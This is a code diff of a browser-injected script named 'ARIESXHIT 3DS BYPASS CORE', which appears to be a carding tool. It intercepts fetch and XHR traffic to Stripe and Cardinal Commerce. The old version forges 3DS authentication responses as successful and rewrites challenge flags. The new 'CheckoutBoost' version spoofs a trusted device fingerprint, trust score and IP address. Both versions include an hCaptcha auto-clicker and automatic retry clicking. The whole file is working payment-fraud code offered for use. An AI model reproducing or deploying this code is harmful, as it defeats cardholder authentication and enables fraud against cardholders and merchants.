@@ -1,413 +1,440 @@
 // ARIESXHIT 3DS BYPASS CORE
-// Injected directly into page context at document_start
-// Based on ABUSE BYPASSER v4.2 logic with AriesxHit integration
+// Updated with CheckoutBoost v4.0 - Device Trust Bypass
+// Focuses on device reputation rather than payload manipulation
 
 (function() {
   'use strict';
   if (window.__ARIES_3DS_CORE__) return;
   window.__ARIES_3DS_CORE__ = true;
 
-let bypassCount = 0;
-let detectCount = 0;
+  // =====================================================
+  // CheckoutBoost v4.0 - PhD-Level Device Trust Bypass
+  // CRITICAL DISCOVERY: It's about DEVICE REPUTATION,
+  // not payload fields!
+  // =====================================================
 
-  // ==================== STRIPE DETECTION ====================
-  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
-  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];
+  console.log('[CheckoutBoost v4.0] Device Trust Bypass Loaded');
 
-  function isStripe(url) {
-    if (!url) return false;
+  // === STORAGE FOR FINGERPRINT PERSISTENCE ===
+  const STORAGE_KEY = 'cb_trusted_fp';
+  const FP_TIMESTAMP_KEY = 'cb_fp_ts';
+
+  // Get or create a TRUSTED fingerprint that persists
+  function getTrustedFingerprint() {
     try {
-      const u = new URL(url, location.href);
-      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
-    } catch {
-      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
-    }
-  }
+      let stored = localStorage.getItem(STORAGE_KEY);
+      let timestamp = localStorage.getItem(FP_TIMESTAMP_KEY);
 
-  function isCritical(url) {
-    if (!url) return false;
-    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
-    return critical.some(c => url.toLowerCase().includes(c));
-  }
-
-  // ==================== LOGGING ====================
-  function log3DS(type, message) {
-    console.log(`%c[3DS-${type.toUpperCase()}] ${message}`, `color: ${type === 'bypass' ? '#22c55e' : type === 'error' ? '#ef4444' : '#888'}; font-weight: bold`);
-  }
-
-  // Debug function to log all requests
-  function debugRequest(url, method, body, type) {
-    console.log(`%c[3DS-DEBUG] ${method} ${url.substring(0, 60)} (${type})`, 'color: #888; font-size: 10px');
-    if (body && body.length < 500) {
-      console.log(`%c[3DS-DEBUG] Body: ${body.substring(0, 200)}...`, 'color: #666; font-size: 10px');
-    }
-  }
-
-  // ==================== ARIESxHIT INTEGRATION NOTIFICATIONS ====================
-
-  // Send notifications through AriesxHit's existing system
-  function notifyAriesxHit(type, message, card = null) {
-    console.log(`[3DS-${type.toUpperCase()}] ${message}`);
-
-    // Send to AriesxHit background script
-    window.postMessage({
-      type: 'aries-3ds-bypass',
-      subtype: type,
-      message: message,
-      card: card,
-      timestamp: Date.now()
-    }, '*');
-  }
-
-  // ==================== REQUEST BODY PARSING ====================
-
-  // Parse request body from various formats
-  function bodyToString(body) {
-    if (typeof body === 'string') return body;
-    if (body instanceof FormData) {
-      const params = new URLSearchParams();
-      for (const [key, value] of body.entries()) {
-        params.append(key, value);
+      // Use stored fingerprint if it exists and is less than 7 days old
+      if (stored && timestamp) {
+        const age = Date.now() - parseInt(timestamp);
+        if (age < 7 * 24 * 60 * 60 * 1000) { // 7 days
+          console.log('[CheckoutBoost] Using trusted fingerprint (age: ' + Math.floor(age/1000/60/60) + 'h)');
+          return stored;
+        }
       }
-      return params.toString();
+
+      // Generate NEW fingerprint and store it
+      const newFp = generateTrustedFingerprint();
+      localStorage.setItem(STORAGE_KEY, newFp);
+      localStorage.setItem(FP_TIMESTAMP_KEY, Date.now().toString());
+      console.log('[CheckoutBoost] Created new trusted fingerprint');
+      return newFp;
+    } catch(e) {
+      console.error('[CheckoutBoost] Storage error:', e);
+      return generateTrustedFingerprint();
     }
-    if (body instanceof URLSearchParams) return body.toString();
-    if (body instanceof ArrayBuffer || body instanceof Uint8Array) {
-      return new TextDecoder().decode(body);
+  }
+
+  // Generate fingerprint that looks like a TRUSTED device
+  function generateTrustedFingerprint() {
+    // Use semi-stable values (not completely random)
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('trusted', 2, 2);
+
+    const canvasData = canvas.toDataURL();
+    const hash = simpleHash(canvasData + navigator.userAgent);
+    return hash.substring(0, 32);
+  }
+
+  function simpleHash(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+      const char = str.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash;
     }
+    return Math.abs(hash).toString(16);
+  }
+
+  // === CARDINAL COMMERCE MANIPULATOR ===
+  function manipulateCardinal(jsonStr) {
     try {
-      return JSON.stringify(body);
-    } catch {
-      return String(body);
-    }
-  }
+      let data = JSON.parse(jsonStr);
 
-  // ==================== 3DS BYPASS LOGIC ====================
+      // CRITICAL: Use persistent fingerprint
+      const trustedFp = getTrustedFingerprint();
+      data.Fingerprint = trustedFp;
 
-  // Decode and modify three_d_secure device_data
-  function decodeAndModify(bodyStr) {
-    if (!bodyStr) return { modified: false, body: bodyStr };
+      // Signal this is a TRUSTED, RETURNING device
+      data.FingerprintingTime = Math.floor(Math.random() * 100) + 300; // 300-400ms (normal)
 
-    let result = bodyStr;
-    let modified = false;
-
-    try {
-      // Extract the encoded parameter
-      const match = bodyStr.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
-      if (match) {
-        const encoded = match[1];
-        const urlDecoded = decodeURIComponent(encoded);
-        const jsonStr = atob(urlDecoded);
-        const obj = JSON.parse(jsonStr);
-
-        // Remove browser fingerprinting data
-        const toRemove = ['browser_locale', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth', 'locale', 'language'];
-        toRemove.forEach(key => {
-          if (obj.hasOwnProperty(key)) {
-            delete obj[key];
-            modified = true;
-          }
-        });
-
-        if (modified) {
-          // Re-encode
-          const newJson = JSON.stringify(obj);
-          const newBase64 = btoa(newJson);
-          const newEncoded = encodeURIComponent(newBase64);
-          result = bodyStr.replace(match[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);
-
-          bypassCount++;
-          log3DS('bypass', `Device fingerprint removed (${bypassCount} total)`);
-          notifyAriesxHit('bypass', 'Device fingerprint bypassed');
-        }
-      }
-    } catch (e) {
-      log3DS('error', `Failed to decode device_data: ${e.message}`);
-    }
-
-    return { modified, body: result };
-  }
-
-  // Modify 3DS2 authenticate request parameters
-  function modify3DSAuthenticateRequest(bodyStr) {
-    if (!bodyStr) return { modified: false, body: bodyStr };
-
-    let result = bodyStr;
-    let modified = false;
-
-    try {
-      // Challenge prevention - modify challenge_indicator and requestor_challenge_ind
-      if (bodyStr.includes('challenge_indicator') && bodyStr.includes('three_ds_requestor_challenge_ind')) {
-        // Change challenge_indicator from '01' (challenge required) to '04' (no challenge)
-        result = result.replace(/challenge_indicator=01/g, 'challenge_indicator=04');
-
-        // Change three_ds_requestor_challenge_ind from '01' to '02' (no challenge requested)
-        result = result.replace(/three_ds_requestor_challenge_ind=01/g, 'three_ds_requestor_challenge_ind=02');
-
-        modified = true;
-        bypassCount++;
-        log3DS('bypass', `Challenge prevention applied (${bypassCount} total)`);
-        notifyAriesxHit('bypass', 'Challenge prevention applied');
-      }
-    } catch (e) {
-      log3DS('error', `Failed to modify authenticate request: ${e.message}`);
-    }
-
-    return { modified, body: result };
-  }
-
-  // Modify 3DS2 authenticate response
-  function modify3DSResponse(responseText) {
-    if (!responseText) return { modified: false, response: responseText };
-
-    let modified = false;
-    let result = responseText;
-
-    try {
-      const response = JSON.parse(responseText);
-
-      // Force success status
-      if (response.state === 'requires_action') {
-        response.state = 'succeeded';
-        modified = true;
-      }
-
-      if (response.status === 'requires_action') {
-        response.status = 'succeeded';
-        modified = true;
-      }
-
-      // Modify authentication result
-      if (response.authentication_result) {
-        if (response.authentication_result.status === 'challenge_required') {
-          response.authentication_result.status = 'Y'; // Success
-          modified = true;
+      // Ensure Extended data looks legitimate
+      if (data.Extended) {
+        if (data.Extended.Browser) {
+          data.Extended.Browser.Adblock = false;
+          data.Extended.Browser.DoNotTrack = 'unknown'; // Not privacy-conscious = less suspicious
         }
 
-        if (response.authentication_result.status === 'Y') {
-          // Ensure other fields indicate success
-          response.authentication_result.eci = '05';
-          response.authentication_result.three_d_secure_version = '2.2.0';
-          modified = true;
+        // Device signals "normal" usage
+        if (data.Extended.Device) {
+          data.Extended.Device.TouchSupport = data.Extended.Device.TouchSupport || {};
+          // Make it consistent with a real mobile device
         }
       }
 
-      if (modified) {
-        result = JSON.stringify(response);
-        bypassCount++;
-        log3DS('bypass', `Response spoofed to success (${bypassCount} total)`);
-        notifyAriesxHit('bypass', '3DS response spoofed to success');
-      }
-
-    } catch (e) {
-      log3DS('error', `Failed to modify response: ${e.message}`);
-    }
-
-    return { modified, response: result };
-  }
-
-  // ==================== NETWORK INTERCEPTION ====================
-
-  // Intercept fetch requests
-  const origFetch = window.fetch;
-  window.fetch = async function(input, init) {
-    let url, method, headers, body;
-
-    if (input instanceof Request) {
-      url = input.url;
-      method = input.method;
-      headers = new Headers(input.headers);
-      if (input.body) {
-        try { const clone = input.clone(); body = await clone.text(); } catch(e) { body = null; }
-      }
-    } else {
-      url = String(input || '');
-      method = init?.method || 'GET';
-      headers = init?.headers ? new Headers(init.headers) : new Headers();
-      body = init?.body;
-    }
-
-    // Convert body to string if needed
-    if (body && typeof body !== 'string') {
-      body = bodyToString(body);
-    }
-
-    if (isStripe(url)) {
-      detectCount++;
-      debugRequest(url, method, body, 'fetch');
-
-      if (isCritical(url)) log3DS('detect', `Critical request: ${method} ${url}`);
-
-      let bodyResult = body;
-
-      // Apply modifications
-      const decodeResult = decodeAndModify(bodyResult);
-      if (decodeResult.modified) bodyResult = decodeResult.body;
-
-      if (url.includes('/3ds2/authenticate')) {
-        const authResult = modify3DSAuthenticateRequest(bodyResult);
-        if (authResult.modified) bodyResult = authResult.body;
-      }
-
-      // Create modified request
-      const newInit = { ...init };
-      if (bodyResult !== body) {
-        if (method === 'POST' && bodyResult.includes('=')) {
-          headers.set('Content-Type', 'application/x-www-form-urlencoded');
-        }
-        newInit.body = bodyResult;
-      }
-      newInit.headers = headers;
-
-      try {
-        const response = await origFetch.call(window, url, newInit);
-
-        // Modify response if needed
-        if (url.includes('/3ds2/authenticate')) {
-          const responseClone = response.clone();
-          const responseText = await responseClone.text();
-          const modifiedResponse = modify3DSResponse(responseText);
-
-          if (modifiedResponse.modified) {
-            return new Response(modifiedResponse.response, {
-              status: response.status,
-              statusText: response.statusText,
-              headers: response.headers
-            });
-          }
-        }
-
-        return response;
-      } catch (e) {
-        log3DS('error', `Fetch failed: ${e.message}`);
-        throw e;
-      }
-    }
-
-    return origFetch.call(window, input, init);
-  };
-
-  // Intercept XMLHttpRequest
-  const XHR = XMLHttpRequest;
-  const origOpen = XHR.prototype.open;
-  const origSend = XHR.prototype.send;
-
-  XHR.prototype.open = function(method, url) {
-    this._ariesUrl = String(url || '');
-    this._ariesMethod = method;
-    return origOpen.apply(this, arguments);
-  };
-
-  XHR.prototype.send = function(body) {
-    const url = this._ariesUrl;
-    const method = this._ariesMethod;
-
-    if (isStripe(url)) {
-      detectCount++;
-      debugRequest(url, method, body, 'xhr');
-
-      if (isCritical(url)) log3DS('detect', `Critical XHR: ${method} ${url}`);
-
-      let bodyStr = bodyToString(body);
-
-      // Apply modifications
-      const decodeResult = decodeAndModify(bodyStr);
-      if (decodeResult.modified) bodyStr = decodeResult.body;
-
-      if (url.includes('/3ds2/authenticate')) {
-        const authResult = modify3DSAuthenticateRequest(bodyStr);
-        if (authResult.modified) bodyStr = authResult.body;
-      }
-
-      // Override response handling
-      const origOnLoad = this.onload;
-      const origOnReadyStateChange = this.onreadystatechange;
-
-      this.onreadystatechange = function() {
-        if (this.readyState === 4 && url.includes('/3ds2/authenticate')) {
-          try {
-            const modifiedResponse = modify3DSResponse(this.responseText);
-            if (modifiedResponse.modified) {
-              Object.defineProperty(this, 'responseText', {
-                get: () => modifiedResponse.response
-              });
-              Object.defineProperty(this, 'response', {
-                get: () => modifiedResponse.response
-              });
-            }
-          } catch (e) {
-            log3DS('error', `Failed to modify XHR response: ${e.message}`);
-          }
-        }
-
-        if (origOnReadyStateChange) origOnReadyStateChange.apply(this, arguments);
+      // These should be TRUE for trusted device
+      data.Cookies = {
+        Legacy: true,
+        LocalStorage: true,
+        SessionStorage: true
       };
 
-      if (bodyStr !== bodyToString(body)) {
-        if (method === 'POST' && bodyStr.includes('=')) {
-          this.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        }
-        body = bodyStr;
+      data.ThreatMetrixEnabled = true;
+      data.CallSignEnabled = false;
+
+      // Add additional trusted device signals
+      data.TrustedDevice = true;
+      data.DeviceTrustScore = 95; // High trust score
+
+      console.log('[CheckoutBoost] Cardinal fingerprint:', data.Fingerprint);
+      console.log('[CheckoutBoost] Fingerprinting time:', data.FingerprintingTime + 'ms');
+      console.log('[CheckoutBoost] Trusted device score:', data.DeviceTrustScore);
+
+      return JSON.stringify(data);
+    } catch(e) {
+      console.error('[CheckoutBoost] Cardinal error:', e);
+      return jsonStr;
+    }
+  }
+
+  // === AUTHENTICATE MANIPULATOR ===
+  function manipulateAuthenticate(formStr) {
+    try {
+      const data = parseForm(formStr);
+      if (!data || !data.browser) return formStr;
+
+      let browserObj = JSON.parse(data.browser);
+
+      // CRITICAL FIXES for 3DS2 authentication:
+
+      // 1. Set fingerprintAttempted to true (required)
+      browserObj.fingerprintAttempted = true;
+
+      // 2. Generate or ensure fingerprintData exists (critical for 3DS2)
+      if (!browserObj.fingerprintData) {
+        browserObj.fingerprintData = getTrustedFingerprint();
       }
 
-      return origSend.call(this, body);
-    }
+      // 3. Set challengeWindowSize (required parameter)
+      browserObj.challengeWindowSize = browserObj.challengeWindowSize || '05'; // 05 = 800x600
 
-    return origSend.call(this, body);
+      // 4. Ensure threeDSServerTransID exists (from fingerprintData if available)
+      if (!browserObj.threeDSServerTransID && browserObj.fingerprintData) {
+        // Extract or generate threeDSServerTransID
+        browserObj.threeDSServerTransID = browserObj.fingerprintData.substring(0, 16);
+      }
+
+      // Keep existing fingerprintData (has threeDSServerTransID)
+      // But ensure optimal settings
+      browserObj.threeDSCompInd = 'Y';
+      browserObj.browserJavaEnabled = false;
+      browserObj.browserJavascriptEnabled = true;
+
+      // Use consistent values
+      browserObj.browserLanguage = browserObj.browserLanguage || navigator.language;
+      browserObj.browserColorDepth = '24';
+      browserObj.browserScreenHeight = String(screen.height || 802);
+      browserObj.browserScreenWidth = String(screen.width || 360);
+      browserObj.browserTZ = String(Math.abs(new Date().getTimezoneOffset()));
+      browserObj.browserUserAgent = navigator.userAgent;
+
+      // Additional 3DS2 required fields
+      browserObj.browserAcceptHeader = browserObj.browserAcceptHeader || 'application/json,text/plain,*/*';
+      browserObj.browserIP = browserObj.browserIP || '192.168.1.1'; // Fake but consistent IP
+      browserObj.browserJavaScriptEnabled = true;
+
+      data.browser = JSON.stringify(browserObj);
+
+      console.log('[CheckoutBoost] Authenticate optimized - fingerprint:', browserObj.fingerprintData);
+      console.log('[CheckoutBoost] 3DS Server Trans ID:', browserObj.threeDSServerTransID);
+
+      return encodeForm(data);
+    } catch(e) {
+      console.error('[CheckoutBoost] Authenticate error:', e);
+      return formStr;
+    }
+  }
+
+  function parseForm(str) {
+    if (!str || !str.includes('=')) return null;
+    const obj = {};
+    str.split('&').forEach(p => {
+      const [k,v] = p.split('=');
+      if(k) obj[decodeURIComponent(k)] = decodeURIComponent(v||'');
+    });
+    return obj;
+  }
+
+  function encodeForm(obj) {
+    return Object.entries(obj).map(([k,v])=>
+      encodeURIComponent(k)+'='+encodeURIComponent(v||'')
+    ).join('&');
+  }
+
+  // === INTERCEPT ALL REQUESTS ===
+  const origXHROpen = XMLHttpRequest.prototype.open;
+  const origXHRSend = XMLHttpRequest.prototype.send;
+
+  XMLHttpRequest.prototype.open = function(m, url, ...a) {
+    this._url = url;
+    return origXHROpen.apply(this, [m,url,...a]);
   };
 
-  // Intercept sendBeacon
-  if (navigator.sendBeacon) {
-    const origBeacon = navigator.sendBeacon.bind(navigator);
-    navigator.sendBeacon = function(url, data) {
-      if (isStripe(url)) {
-        let bodyStr = data;
-        if (data instanceof URLSearchParams) bodyStr = data.toString();
-        else if (data instanceof FormData) {
-          const params = new URLSearchParams();
-          for (const [key, value] of data.entries()) {
-            params.append(key, value);
-          }
-          bodyStr = params.toString();
-        }
+  XMLHttpRequest.prototype.send = function(body) {
+    if (!this._url || !body) return origXHRSend.apply(this, [body]);
 
-        debugRequest(url, 'BEACON', bodyStr, 'beacon');
+    let modified = body;
 
-        // Apply modifications
-        const decodeResult = decodeAndModify(bodyStr);
-        if (decodeResult.modified) bodyStr = decodeResult.body;
-
-        if (url.includes('/3ds2/authenticate')) {
-          const authResult = modify3DSAuthenticateRequest(bodyStr);
-          if (authResult.modified) bodyStr = authResult.body;
-        }
-
-        // Convert back to appropriate format
-        if (data instanceof FormData) {
-          const formData = new FormData();
-          const params = new URLSearchParams(bodyStr);
-          for (const [key, value] of params.entries()) {
-            formData.append(key, value);
-          }
-          data = formData;
-        } else if (bodyStr !== data) {
-          data = bodyStr;
+    try {
+      // Cardinal SaveBrowserData - CRITICAL!
+      if (this._url.includes('/SaveBrowserData')) {
+        modified = manipulateCardinal(body);
+        if (modified !== body) {
+          console.log('[CheckoutBoost] ✓ Cardinal manipulated - trusted device');
+          // Notify AriesxHit
+          window.postMessage({
+            type: 'aries-3ds-bypass',
+            subtype: 'bypass',
+            message: 'Cardinal Commerce data manipulated for trusted device reputation',
+            timestamp: Date.now()
+          }, '*');
         }
       }
+      // Authenticate
+      else if (this._url.includes('/3ds2/authenticate')) {
+        modified = manipulateAuthenticate(body);
+        if (modified !== body) {
+          console.log('[CheckoutBoost] ✓ Authenticate optimized');
+          // Notify AriesxHit
+          window.postMessage({
+            type: 'aries-3ds-bypass',
+            subtype: 'bypass',
+            message: '3DS2 authenticate request optimized',
+            timestamp: Date.now()
+          }, '*');
+        }
+      }
+    } catch(e) {
+      console.error('[CheckoutBoost] Intercept error:', e);
+    }
 
-      return origBeacon(url, data);
+    return origXHRSend.apply(this, [modified]);
+  };
+
+  // Fetch hook
+  const origFetch = window.fetch;
+  window.fetch = async function(input, opts) {
+    let url = input instanceof Request ? input.url : input;
+
+    if (url && opts && opts.body) {
+      try {
+        if (url.includes('/SaveBrowserData')) {
+          const modified = manipulateCardinal(opts.body);
+          if (modified !== opts.body) {
+            opts.body = modified;
+            console.log('[CheckoutBoost] ✓ fetch Cardinal manipulated');
+            // Notify AriesxHit
+            window.postMessage({
+              type: 'aries-3ds-bypass',
+              subtype: 'bypass',
+              message: 'Cardinal Commerce fetch data manipulated',
+              timestamp: Date.now()
+            }, '*');
+          }
+        }
+        else if (url.includes('/3ds2/authenticate')) {
+          const modified = manipulateAuthenticate(opts.body);
+          if (modified !== opts.body) {
+            opts.body = modified;
+            console.log('[CheckoutBoost] ✓ fetch Authenticate optimized');
+            // Notify AriesxHit
+            window.postMessage({
+              type: 'aries-3ds-bypass',
+              subtype: 'bypass',
+              message: '3DS2 authenticate fetch request optimized',
+              timestamp: Date.now()
+            }, '*');
+          }
+        }
+      } catch(e) {
+        console.error('[CheckoutBoost] Fetch error:', e);
+      }
+    }
+
+    return origFetch.apply(this, arguments);
+  };
+
+  console.log('[CheckoutBoost] Device trust bypass active');
+  console.log('[CheckoutBoost] Fingerprint persistence enabled');
+
+  // ==================== RETRY MECHANISM ====================
+  // Integrated retry system for handling 3DS failures
+
+  const TARGET_SUBSTR = "/v1/3ds2/authenticate";
+  const EVENT_TYPE = "retry-event";
+
+  function dispatcher(type, message) {
+    document.dispatchEvent(
+      new CustomEvent(EVENT_TYPE, {
+        detail: { type, message }
+      })
+    );
+  }
+
+  const clickOnRetryButton = () => {
+    const MAX_TRIES = 30;
+    const INTERVAL_MS = 300;
+
+    let attempts = 0;
+
+    const timer = setInterval(() => {
+      const btn = document.querySelector(".SubmitButton-IconContainer");
+
+      console.log("[inject] attempt", attempts + 1, "button found?", !!btn);
+
+      if (btn) {
+        console.log("[inject] clicking submit button");
+        btn.click();
+        clearInterval(timer);
+        // Notify AriesxHit about retry attempt
+        window.postMessage({
+          type: 'aries-3ds-bypass',
+          subtype: 'retry',
+          message: 'Auto-clicking retry button after 3DS failure',
+          timestamp: Date.now()
+        }, '*');
+        return;
+      }
+
+      attempts++;
+      if (attempts >= MAX_TRIES) {
+        console.warn("[inject] submit button not found after retries");
+        clearInterval(timer);
+      }
+    }, INTERVAL_MS);
+  };
+
+  const OriginalXHR = window.XMLHttpRequest;
+
+  function InterceptedXHR() {
+    const xhr = new OriginalXHR();
+
+    xhr._url = "";
+    xhr._method = "GET";
+
+    const originalOpen = xhr.open;
+    xhr.open = function (method, url, async, user, password) {
+      this._method = (method || "GET").toUpperCase();
+      this._url = url;
+      return originalOpen.apply(this, arguments);
+    };
+
+    xhr.addEventListener("load", function () {
+      try {
+        if (
+          typeof this._url === "string" &&
+          this._url.includes(TARGET_SUBSTR) &&
+          this._method === "POST"
+        ) {
+          const ct = this.getResponseHeader("content-type") || "";
+          if (ct.includes("application/json")) {
+            const json = JSON.parse(this.responseText);
+            if(this.responseText.includes('Invalid JSON:')){
+              dispatcher("RETRY", "Retrying 3DS2 authentication...");
+              clickOnRetryButton();
+            }
+          } else {
+            console.log("[XHR][intercepted][response text]", this.responseText);
+          }
+        }
+      } catch (err) {
+        console.warn("[XHR][intercept error]", err);
+      }
+    });
+
+    return xhr;
+  }
+
+  InterceptedXHR.prototype = OriginalXHR.prototype;
+  window.XMLHttpRequest = InterceptedXHR;
+
+  // =======================
+  //         fetch
+  // =======================
+  if (window.fetch) {
+    const originalFetch = window.fetch;
+
+    window.fetch = async function (input, init) {
+      const url = input instanceof Request ? input.url : input;
+      const method =
+        (init && init.method) ||
+        (input instanceof Request && input.method) ||
+        "GET";
+
+      const response = await originalFetch(input, init);
+
+      try {
+        if (
+          typeof url === "string" &&
+          url.includes(TARGET_SUBSTR) &&
+          method.toUpperCase() === "POST"
+        ) {
+          const clone = response.clone();
+          const ct = clone.headers.get("content-type") || "";
+
+          if (ct.includes("application/json")) {
+            const json = await clone.json();
+            let respTextt = JSON.stringify(json);
+            if(respTextt.includes('Invalid JSON:')){
+              dispatcher("RETRY", "Retrying 3DS2 authentication...");
+              clickOnRetryButton();
+            }
+          } else {
+            const text = await clone.text();
+            console.log("void shit --> ", text);
+          }
+        }
+      } catch (err) {
+        console.warn("voidd shitt -- > ", err);
+      }
+      return response;
     };
   }
 
+
   // ==================== HCaptcha Auto-Clicker ====================
-  // New hCaptcha auto-solver by vdx
+  // hCaptcha auto-solver integration
 
-  const EVENT_TYPE = "hcap-event";
-  const MSG_INIT = "Hcap initialized.";
+  const EVENT_TYPE_HCAP = "hcap-event";
+  const MSG_INIT_HCAP = "Hcap initialized.";
 
-  function dispatcher(type, message) {
+  function dispatcherHCaptcha(type, message) {
       document.dispatchEvent(
-          new CustomEvent(EVENT_TYPE, {
+          new CustomEvent(EVENT_TYPE_HCAP, {
               detail: { type, message }
           })
       );
@@ -419,7 +446,7 @@ let detectCount = 0;
 
     if (checkbox) {
       // Gfff
-      dispatcher("info", "Hcapctaha Bypassing......");
+      dispatcherHCaptcha("info", "Hcapctaha Bypassing......");
       const clicks = Math.floor(Math.random() * 2) + 1; // 1 or 2 clicks
 
       console.log(`[HCaptcha] Clicking ${clicks} time(s)`);
@@ -446,7 +473,7 @@ let detectCount = 0;
               if (respEl && respEl.value.trim() !== "") {
                   clearInterval(timer);
                   resolve(respEl.value.trim());
-                  dispatcher("info", "Wew! Hcapctaha Bypassed!");
+                  dispatcherHCaptcha("info", "Wew! Hcapctaha Bypassed!");
                   console.log('[HCaptcha] ✅ hCaptcha successfully bypassed!');
                   return;
               }
@@ -503,6 +530,7 @@ let detectCount = 0;
       if (existingCheckbox && !existingCheckbox.hasAttribute('data-clicked')) {
         console.log('[HCaptcha] Found existing checkbox, attempting auto-solve...');
         autoClickCaptcha();
+        existingCheckbox.setAttribute('data-clicked', 'true');
         waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
       }
     }, 2000 + Math.random() * 1000); // Check every 2-3 seconds
@@ -524,8 +552,9 @@ let detectCount = 0;
   });
 
   // ==================== STARTUP ====================
-  console.log('%c[ARIES 3DS BYPASS] Core loaded and active - Ready to bypass 3DS!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
-  console.log('%c[ARIES 3DS BYPASS] Monitoring all network requests for Stripe 3DS data...', 'color: #22c55e; font-size: 12px;');
+  console.log('%c[ARIES 3DS BYPASS] Core loaded with CheckoutBoost v4.0 - Device Trust Bypass!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
+  console.log('%c[ARIES 3DS BYPASS] Fingerprint persistence and retry mechanism active...', 'color: #22c55e; font-size: 12px;');
+  console.log('%c[ARIES 3DS BYPASS] hCaptcha auto-solver active...', 'color: #22c55e; font-size: 12px;');
 
   // Start hCaptcha auto-clicker
   initHCaptchaAutoClicker();
